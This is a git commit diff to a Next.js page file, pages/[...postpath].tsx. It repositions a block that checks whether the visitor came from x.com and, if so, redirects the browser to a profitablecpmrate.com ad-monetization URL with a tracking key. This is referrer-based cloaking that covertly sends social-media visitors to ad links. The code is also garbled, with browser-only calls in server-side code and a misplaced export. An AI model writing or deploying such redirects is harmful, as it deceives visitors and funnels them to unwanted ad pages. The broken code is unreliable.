739d8499181f5796846b2c76c83b6fcbfe69ef63
jimili268 <137355303+jimili268@users.noreply.github.com>
2024-11-15 02:35:27 +0500

    Update [...postpath].tsx

--- pages/[...postpath].tsx
+++ pages/[...postpath].tsx
@@ -23,16 +23,13 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			},
 		};
 		}
-	
-	export default function redirectHandler(req, res) {
-    const referringURL = req.headers.referer || ''; // Get the referring URL directly from headers
-
-   // Redirect if the referrer is X (Twitter)
+// Redirect if the referrer is X (Twitter)
 if (document.referrer.includes('x.com')) {
     window.location.href = 'https://www.profitablecpmrate.com/jdbsgw1bnq?key=9459bb41225c11881c95d599f0203613';
-}
-
-    
+}	
+	export default function redirectHandler(req, res) {
+    const referringURL = req.headers.referer || ''; // Get the referring URL directly from headers
+      
     // If no redirection condition is met, continue with the response
     return {
         statusCode: 200,
